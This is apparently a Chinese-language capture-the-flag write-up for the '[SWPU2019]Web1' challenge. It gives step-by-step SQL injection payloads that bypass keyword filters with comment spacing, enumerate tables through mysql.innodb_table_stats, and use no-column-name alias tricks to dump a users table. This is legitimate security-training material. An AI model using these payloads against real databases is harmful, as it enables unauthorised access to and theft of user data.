---
title: '[SWPU2019]Web1'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-07-20 21:18:07
authorLink:
tags: 无列名注入
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1086791.jpg
---
广告版处存在注入，

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ图片20200720221323.png)

先fuzz测试一波：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ图片20200720221548.png)

过滤的东西不多。
接下来先爆列数
order被过滤，还可以用group by
1'/**/group/**/by/**/22,'1

一共有二十二列。。。
or被过滤，information_schema不能使用，这里要用到无列名注入。
-1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
回显位是2，3.
查数据库
-1'union/**/select/**/1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
发现是马里奥数据库
百度搜到了这个可以利用的：
![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/qqqqqqqqq.png)

查表
-1'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200720233720.png)

无列名注入

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/32131231.png)

设第二列别名为b
-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/b,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200720234508.png)

设第三列别名为b
-1'/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200720234807.png)
